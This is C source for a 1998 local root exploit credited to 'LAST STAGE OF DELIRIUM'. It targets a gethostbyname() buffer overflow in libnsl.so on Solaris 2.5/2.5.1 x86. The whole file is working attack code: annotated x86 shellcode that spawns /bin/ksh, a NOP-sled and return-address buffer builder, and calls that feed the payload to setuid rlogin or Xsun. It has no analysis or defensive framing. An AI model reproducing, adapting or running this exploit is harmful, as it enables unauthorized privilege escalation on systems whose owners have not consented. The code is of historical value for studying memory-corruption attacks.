/*## copyright LAST STAGE OF DELIRIUM apr 1998 poland        *://lsd-pl.net/ #*/
/*## libnsl.so gethostbyname()                                               #*/

unsigned int ADRNUM[2]={  6912,  2000};
unsigned int NOPNUM[2]={  1254,  1500};
unsigned int PCHNUM[2]={    88,     0};
unsigned int ALLIGN[2]={     0,     1};
unsigned int ADROFS[2]={  3000, 10500};
unsigned int PCHOFS[2]={ 10000,    10};
unsigned char *SBUF[2]={"NSAP","LANS"};

char shellcode[]=
    "\xeb\x1b"             /* jmp     <shellcode+30>       */
    "\x33\xd2"             /* xorl    %edx,%edx            */
    "\x58"                 /* popl    %eax                 */
    "\x8d\x78\x14"         /* leal    0x14(%eax),edi       */
    "\x52"                 /* pushl   %edx                 */
    "\x57"                 /* pushl   %edi                 */
    "\x50"                 /* pushl   %eax                 */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x92"                 /* xchgl   %eax,%edx            */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x88\x42\x08"         /* movb    %al,0x8(%edx)        */
    "\x83\xef\x3c"         /* subl    $0x3c,%edi           */
    "\xb0\x9a"             /* movb    $0x9a,%al            */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x47"                 /* incl    %edi                 */
    "\xb0\x07"             /* movb    $0x7,%al             */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\xb0\x3b"             /* movb    $0x3b,%al            */
    "\xe8\xe0\xff\xff\xff" /* call    <shellcode+2>        */
    "/bin/ksh"
;

char jump[]=
    "\x8b\xc4"             /* movl    %esp,%eax            */
    "\xc3"                 /* ret                          */
;

main(int argc,char **argv){
    char buffer[20000],adr[4],pch[4],*b,*o; 
    int i,n=-1;

    printf("copyright LAST STAGE OF DELIRIUM apr 1998 poland  //lsd-pl.net/\n");
    printf("libnsl.so gethostbyname() for solaris 2.5 2.5.1 x86\n\n");

    if(argc==1){
        printf("usage: %s {rlogin|Xsun}\n",argv[0]); 
        exit(-1);
    }
    if(!strcmp(argv[1],"rlogin")) n=0;
    if(!strcmp(argv[1],"Xsun")) n=1;
    if(n==-1) exit(-1);

    b=buffer;
    o=SBUF[n];
    while(*o!=0){
        switch(*o++){
        case 'N':
            for(i=0;i<NOPNUM[n];i++) *b++=0x90; 
            break;
        case 'A':
            *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+ADROFS[n];
            for(i=0;i<ADRNUM[n];i++) *b++=adr[i%4]; 
            break;
        case 'P':
            *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+PCHOFS[n];
            for(i=0;i<PCHNUM[n];i++) *b++=pch[i%4]; 
            break;
        case 'L':
            for(i=0;i<ALLIGN[n];i++) *b++=0x33; 
            break;
        case 'S':
            for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
        }
    }
    switch(n){
    case 0: execl("/usr/bin/rlogin","rlogin",buffer,0);
    case 1: execl("/usr/openwin/bin/Xsun","Xsun","-indirect",buffer,0);
    }
}

